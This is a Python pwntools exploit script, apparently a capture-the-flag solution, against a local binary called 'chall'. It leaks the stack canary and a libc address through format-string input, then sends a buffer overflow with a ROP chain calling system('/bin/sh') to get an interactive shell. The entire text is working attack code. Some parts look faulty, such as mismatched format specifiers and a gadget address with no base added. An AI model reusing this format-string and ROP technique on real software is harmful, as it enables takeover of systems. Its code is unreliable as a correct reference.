from pwn import *

context.binary = "./src/chall"
libc = ELF("./src/libc.so.6")
elf = ELF("./src/chall")
p = process("./src/chall")

# Leak Libc address (puts)
got_puts = elf.got["puts"]
payload = flat(got_puts, b"%7$i")

# Leak canary
p.sendlineafter(b"key!!): ", b"%25$f" + b" " + payload)
leak = p.recvuntil(b"!").split(b" ")
print(leak)
canary_leak = leak[4].strip()
canary = int(canary_leak, 16)
print(hex(canary))

puts_leak = u64(leak[5][:-1].ljust(8, b"\0"))
print(hex(puts_leak))
libc_base = puts_leak - libc.sym.puts
system = libc_base + libc.sym.system
bin_sh = libc_base + next(libc.search(b"/bin/sh"))

# Buffer overflow
payload = b"A" * (128 + 8)
payload += p64(canary)
payload += b"B" * 8  # RBP
payload += p64(0x0000000000001523)  # pop rdi; ret
payload += p64(bin_sh)
payload += p64(system)

p.sendlineafter(b"age: ", payload)
p.interactive()
